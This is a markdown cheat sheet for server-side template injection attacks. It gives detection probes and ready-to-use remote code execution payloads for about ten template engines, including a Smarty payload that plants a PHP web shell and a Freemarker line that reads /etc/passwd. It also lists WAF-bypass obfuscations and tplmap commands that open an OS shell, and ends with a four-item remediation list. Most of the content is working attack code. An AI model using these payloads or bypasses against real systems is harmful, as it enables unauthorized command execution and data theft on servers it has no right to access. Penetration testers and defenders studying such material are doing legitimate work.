# SSTI — Complete Attack Guide

## 1. Detection

### Universal Detection Payloads
```
{{7*7}}           → 49 (Jinja2, Twig, Nunjucks)
${7*7}            → 49 (Freemarker, Mako, Velocity)
<%= 7*7 %>        → 49 (ERB, Slim)
#{7*7}            → 49 (Ruby Slim, Pug)
{{7*'7'}}         → 777 (Jinja2) vs 49 (Twig)
${{7*7}}          → 49 (Shopify, Go templates)
```

### Identification Flow
```
{{7*7}}  → 49  → Jinja2/Twig/Nunjucks
${7*7}   → 49  → Freemarker/Mako/Velocity
<%=7*7%> → 49  → ERB
#{7*7}   → 49  → Ruby Slim
{{7*'7'}}→ 49  → Twig (string concat) vs 777 → Jinja2 (string repeat)
```

## 2. Exploitation by Template Engine

### 2.1 Jinja2 (Python/Flask)
```python
# Config disclosure
{{config.items()}}
{{config.__class__.__init__.__globals__}}

# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}

# Find INDEX of os._wrap_close
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# request.application trick
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### 2.2 Twig (PHP/Symfony)
```php
# RCE
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|filter('exec')}}
```

### 2.3 Freemarker (Java)
```java
// RCE
<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.lang.ProcessBuilder','id')}

// File read
<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}
```

### 2.4 Velocity (Java)
```java
#set($rt=$x.getRuntime())
#set($proc=$rt.exec('id'))
#set($is=$proc.getInputStream())
#set($sc=$x.new('java.util.Scanner'))
#set($null=$sc.useDelimiter('\\A'))
#set($str=$sc.next())
$str
```

### 2.5 Smarty (PHP)
```php
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET["cmd"]);?>',true)}
```

### 2.6 Thymeleaf (Java/Spring)
```java
__${T(java.lang.Runtime).getRuntime().exec('id')}__
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### 2.7 Pug/Jade (Node.js)
```javascript
#{root.process.mainModule.require('child_process').execSync('id')}
```

### 2.8 Nunjucks (Node.js)
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### 2.9 Mako (Python)
```python
${self.module.runtime.os.popen('id').read()}
<%
import os
os.system('id')
%>
```

### 2.10 ERB (Ruby)
```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

## 3. WAF Bypass

### 3.1 String Concatenation
```
{{config.__class__.__init__.__globals__['o''s'].popen('i''d').read()}}
```

### 3.2 Unicode/Encoding
```
{{config.__class__.__init__.__globals__['\x6f\x73'].popen('\x69\x64').read()}}
```

### 3.3 Filter Bypass
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('o''s')|attr('p''o''p''e''n')('i''d')|attr('r''e''a''d')()}}
```

### 3.4 Mathematical Operations
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
→
{{config.__class__.__init__.__globals__['\157\163'].popen('\151\144').read()}}
```

## 4. Detection Tools

### tplmap
```bash
tplmap -u "http://target/page?name=test"
tplmap -u "http://target/page" --data "name=test"
tplmap -u "http://target/page?name=test" --os-shell
```

### nuclei
```bash
nuclei -u http://target -tags ssti
```

## 5. Remediation

1. **Never render user input in templates** — Use logic-less templates
2. **Sandbox template engines** — Jinja2: `SandboxedEnvironment`, Freemarker: `TemplateClassResolver`
3. **Input validation** — Whitelist allowed characters
4. **Template engine configuration** — Disable dangerous features (file I/O, command execution)
